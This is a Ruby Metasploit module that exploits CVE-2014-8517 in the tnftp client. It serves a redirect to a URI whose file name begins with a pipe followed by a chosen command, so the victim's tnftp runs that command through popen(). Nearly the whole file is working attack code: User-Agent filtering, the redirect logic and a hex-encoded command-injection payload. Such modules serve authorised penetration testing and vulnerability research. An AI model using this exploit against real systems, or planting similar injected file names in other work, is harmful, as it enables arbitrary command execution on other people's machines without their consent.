##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpServer
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'tnftp "savefile" Arbitrary Command Execution',
      'Description' => %q{
        This module exploits an arbitrary command execution vulnerability in
        tnftp's handling of the resolved output filename - called "savefile" in
        the source - from a requested resource.

        If tnftp is executed without the -o command-line option, it will resolve
        the output filename from the last component of the requested resource.

        If the output filename begins with a "|" character, tnftp will pass the
        fetched resource's output to the command directly following the "|"
        character through the use of the popen() function.
      },
      'Author' => [
        'Jared McNeill', # Vulnerability discovery
        'wvu' # Metasploit module
      ],
      'References' => [
        ['CVE', '2014-8517'],
        ['URL', 'http://seclists.org/oss-sec/2014/q4/459']
      ],
      'DisclosureDate' => 'Oct 28 2014',
      'License' => MSF_LICENSE,
      'Actions' => [
        ['Service']
      ],
      'PassiveActions' => [
        'Service'
      ],
      'DefaultAction' => 'Service'
    ))

    register_options([
      OptString.new('CMD', [true, 'Command to run', 'uname -a'])
    ])
  end

  def run
    exploit
  end

  def on_request_uri(cli, request)
    unless request['User-Agent'] =~ /(tn|NetBSD-)ftp/
      print_status("#{request['User-Agent']} connected")
      send_not_found(cli)
      return
    end

    if request.uri.ends_with?(sploit)
      send_response(cli, '')
      print_good("Executing `#{datastore['CMD']}'!")
      report_vuln(
        :host => cli.peerhost,
        :name => self.name,
        :refs => self.references,
        :info => request['User-Agent']
      )
    else
      print_status("#{request['User-Agent']} connected")
      print_status('Redirecting to exploit...')
      send_redirect(cli, sploit_uri)
    end
  end

  def sploit_uri
    (get_uri.ends_with?('/') ? get_uri : "#{get_uri}/") +
      Rex::Text.uri_encode(sploit, 'hex-all')
  end

  def sploit
    "|#{datastore['CMD']}"
  end

end
